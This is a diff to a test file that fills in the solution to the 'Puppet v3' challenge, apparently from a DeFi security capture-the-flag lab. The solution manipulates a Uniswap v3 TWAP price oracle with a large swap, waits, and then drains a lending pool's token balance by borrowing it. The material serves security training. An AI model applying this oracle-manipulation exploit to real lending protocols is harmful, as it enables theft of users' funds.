@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://cloudflare-eth.com";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +140,33 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const routerJson = require("@uniswap/v3-periphery/artifacts/contracts/SwapRouter.sol/SwapRouter.json");
+        const router = new ethers.Contract("0xE592427A0AEce92De3Edee1F18E0157C05861564", routerJson.abi, deployer);
+        await token.connect(player).approve(router.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        const MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342n; // getSqrtRatioAtTick(MAX_TICK)
+        const FEE_PERCENT = 0.3;
+        const FEE = FEE_PERCENT * 10000;
+        await router.connect(player).exactInputSingle({
+            tokenIn: token.address, 
+            tokenOut: weth.address, 
+            fee: FEE, 
+            recipient: player.address, 
+            deadline: (await ethers.provider.getBlock('latest')).timestamp * 2, 
+            amountIn: (110n * 10n ** 18n), 
+            amountOutMinimum: 1n, 
+            sqrtPriceLimitX96: MAX_SQRT_RATIO - 1n},
+            { gasLimit: 3000000 });
+
+        await time.increase(110);
+
+        const totalWETHRequired = await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        expect(totalWETHRequired).to.be.lte(PLAYER_INITIAL_ETH_BALANCE);
+        const slot0 = await uniswapPool.slot0();
+        console.log('slot0: ', slot0);
+
+        await weth.connect(player).approve(lendingPool.address, totalWETHRequired);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
